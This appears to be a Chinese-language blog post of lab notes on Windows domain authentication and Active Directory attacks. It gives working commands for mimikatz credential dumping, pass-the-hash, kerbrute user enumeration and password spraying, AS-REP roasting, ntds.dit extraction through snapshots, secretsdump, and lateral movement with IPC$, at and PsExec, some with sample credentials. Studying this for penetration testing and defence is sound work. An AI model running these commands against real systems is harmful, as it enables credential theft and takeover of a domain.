---
layout: post
title: windows身份认证
categories: [blog ]
tags: [Java,]
description: ""
image:
  feature: windows.jpg
  credit: JYcxk
  creditlink: shzqi
---



```java
密码是放在本机的数据库来验证的，但如果加入域的话，用户名和密码是放在域控制器去验证。
也就是说你的账号密码可以在同一域的任何一台计算机登录。
```

windows用户登录到域的时候，身份验证是采用Kerberos协议在域控制器上进行的，而登录到此计算机则是通过SAM（本机安全账户数据库）来验证的。

## Kerberos协议

是一种网络身份验证协议，旨在通过使用加密技术为客户端/服务端应用程序提供强大的认证服务。

其特点是：用户只需输入一次身份验证信息就可以凭借此验证获得的票据访问多个服务，即SSO单点登录。

![image-20240107202340859](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240107202340859.png)



## <1>哈希传递攻击

背景：渗透中获取不到明文的密码，破解不了NTLM Hash的MD4算法而又想横向渗透。

前提：可以获得靶机的NTLM Hash、用户名、能够访问其他的服务器。

```java
进行哈希传递说明我们已经控制了一台内网内的机器了，想扩大战果，试一试能否用 NTLM Hash登录其他机器，如果多台机器的密码都一样则会攻击成功。
```

利用msf的`exploit/windows/smb/psexeec`模块攻击

首先我们需要获得机器的NTLM Hash的值，利用mimikatz工具

```java
privilege::debug
sekurlsa::logonpasswords
```

![image-20240225225313445](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240225225313445.png)

```java
use exploit/windows/smb/psexec
show options

```

![image-20240225225427758](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240225225427758.png)

![image-20240225225851136](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240225225851136.png)

![image-20240225225909868](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240225225909868.png)



## <2>域内用户枚举

域内用户枚举，即爆破一下域内的账号名

```
kerbrute_windows_386.exe userenum --dc 10.10.10.10 -d de1ay.com user.txt
```

```java
10.10.10.10  //是DC的ip地址（域控）
de1ay.com  //是域的名字
user.txt   //枚举的账号名字
```

![image-20240226154527431](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240226154527431.png)

![image-20240226154550660](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240226154550660.png)

可知这几个用户是存在的

kerbrute进行错误枚举的原理就是kerberos有这样四种错误代码：

- KDC_ERR_PREAUTH_REQUIRED-需要额外的预认证（启用）
- KDC_ERR_CLIENT_REVOKED-客户端凭证已被吊销（禁用）
- KDC_ERR_C_PRINCIPAL_UNKNOWN-在Kerberos数据库中找不到客户端（不存在）
- KDC_ERR_PREAUTH_FAILED (用户存在但密码错误)

注：如果某个用户勾选了 Kerberos预身份验证，则判断不出来，这个在后面AS-REP roasting攻击会讲到

## <3>密码喷洒攻击（用户密码枚举）

```java
kerbrute_windows_386.exe passwordspray --dc 192.168.16.10 -d hack.com user.txt 1qaz@WSX  # 适用于存在用户账户锁定策略
kerbrute_windows_386.exe bruteuser --dc 192.168.16.10 -d hack.com password.txt administrator
```

![image-20240226161017765](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240226161017765.png)

## <4>AS-REP Roasting攻击

#### （1）Roasting攻击简介

AS-REP Roasting攻击是一种对用户账号进行离线爆破的攻击方式，是管理员的错误配置导致的。管理员在DC上 用户账户策略勾选了 不要求Kerberos预身份验证

`一直右击属性找到具体用户，然后右击即可找到`

**![image-20240226161605875](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240226161605875.png)**

![image-20240226161646499](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240226161646499.png)

### AS_REP Roasting攻击的首要条件：

- 勾选了默认不惜要Kerberos预身份验证

预身份验证：

我们没有勾选的情况下，通过kekeo申请票据，这里我们输入正确的账号密码才有AS-REP数据

打上勾之后，在AS—REQ阶段，只需要发个用户名即可不需要发送密码 也会有AS-REP数据

在AS-REP阶段，数据包中最外层的enc-part是用户密码hash加密的

![image-20240226162121905](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240226162121905.png)

**原理**：

- 不需要Kerberos的域身份认证，AS_REP过程中可任意伪造用户名请求票据。通过爆破 enc-part得到获得用户hash，拼接成”Kerberos 5 AS-REP etype 23”(18200)的格式，接下来可以通过hashcat对其破解，最终获得明文密码，构成了 AS-REP Roasting攻击





```java
copy C:\$SNAP_202402261928_VOLUMEC$\windows\NTDS\ntds.dit c:\ntds.dit
```



## 卷影拷贝提取ntds.dit

前言：因为域控制器中的C:\Windows\NTDS\ntds.dit文件即使是管理员也被禁止读取。

使用Windows本地卷影拷贝服务（volume Shadow Copy Server, VSS),就可以获取文件的副本（类似于虚拟机的快照）。

ntds.dit介绍

```java
是一个数据库，用于存储Active Directory数据，包括域中所有用户的密码哈希，是一个二进制文件，包含用户名、散列值、组、GPP、OU等与活动目录相关的信息。它和SAM文件一样，是被操作系统锁定的。
    如果我们获得不就可以哈希传递攻击了嘛~
```

域环境内最重要的是那个文件如下：

```java
ntds.dit文件位置: C:\\Windows\\NTDS\\NTDS.dit
system文件位置：  C:\\Windows\\System32\\config\\SYSTEM
sam文件位置：   C:\\Windows\\System32\\config\\SAM
```

### 通过ntdsutil.exe 提取ntds.dit

ntdsutil是一个为活动目录提供管理机制的命令行工具，该工具默认安装在域控制器上，可以在域控制器上直接操作，也可以通过域内主机在域控制器上远程操作。

#### 支持的操作系统

- Windows  Server 2003  /  2008  /2012

使用方法：就是在域控的命令行，创建一个快照，因为快照中包含Windows中的所有文件，并且复制快照中的任何文件都不会受到Windows锁定机制的限制。

##### 创建快照

```java
ntdsutil snapshot "activate instance ntds" create quit quit 
```

这里的二个quit是执行完后直接关闭的窗口。

![image-20240226213301693](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240226213301693.png)

##### 挂载快照

``` 
ntdsutil snapshot "mount {}"  quit quit
```

![image-20240226213506533](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240226213506533.png)

##### 复制ntds.dit

`这个需要管理员权限才可以复制`

```java
copy C:\$SNAP_202211280955_VOLUMEC$\windows\NTDS\ntds.dit c:\ntds.dit
```

##### 卸载快照

```java
ntdsutil snapshot "unmount {9368eb6a-631b-4e28-b25b-bc78b4674f49}" quit quit
```

##### 删除快照

```java
ntdsutil snapshot "delete {9368eb6a-631b-4e28-b25b-bc78b4674f49}" quit quit
```

最后复制出来的文件可以直接用记事本打开，获取到了ntds.dit文件，接下来就是如何解密这个文件。

![image-20240226214146941](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240226214146941.png)

### system.hive

最后还需要转储system.hive,system.hiv中存放这ntds.dit的密钥，如果没有该密钥，将无法查看ntds.dit中的信息：

```java
reg save hklm\system system.hive
```

同样也是需要管理员权限的，

![image-20240226214547693](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240226214547693.png)

## impacket工具包secretdump导出ntds.dit域内全部hash

```
impacket-secretsdump -system system.hive -ntds ntds.dit LOCAL
```

![image-20240226214636174](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240226214636174.png)



## 横向渗透工具使用

### IPC

**建立 ipc$ 连接的条件：**

- 目标主机开启了139和445端口
- 目标主机管理员开启了ipc$默认共享

1、建立IPC$空连接：

```java
net use \\10.10.10.80\ipc$ "password" /user:"username"
```

2、文件上传

```java
copy 盲注脚本.txt \\10.10.10.80\c$
```

![image-20240227124410048](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240227124410048.png)

![image-20240227124427425](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240227124427425.png)

3.映射路径：

 ```java
 net use z: \\10.10.10.80\c$ "1qaz@WSX" /user:"administrator"
 ```

![image-20240227124736559](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240227124736559.png)

4、 查看时间

```java
net time \\10.10.10.80
```

5、定时任务（at是可以运行的）

```
C:\>at \\127.0.0.1 11:05 srv.exe 
用at命令启动srv.exe吧（这里设置的时间要比主机时间快，不然你怎么启动啊，呵呵！） 
```

6、访问/删除路径：

```
net use z: \\127.0.0.1\c$   #直接访问
net use c: /del     删除映射的c盘，其他盘类推 
net use * /del      删除全部,会有提示要求按y确认
```

7.删除IPC$连接：

```
net use \\127.0.0.1\ipc$ /del
```

8、查看目标主机进程

```java
tasklist /S 192.168.183.130 /U administrator /P liu78963
```







```java
PsExec.exe -accepteula \\192.168.52.138 -u god\liukaifeng01 -p Liufupeng123 -s cmd.exe
```

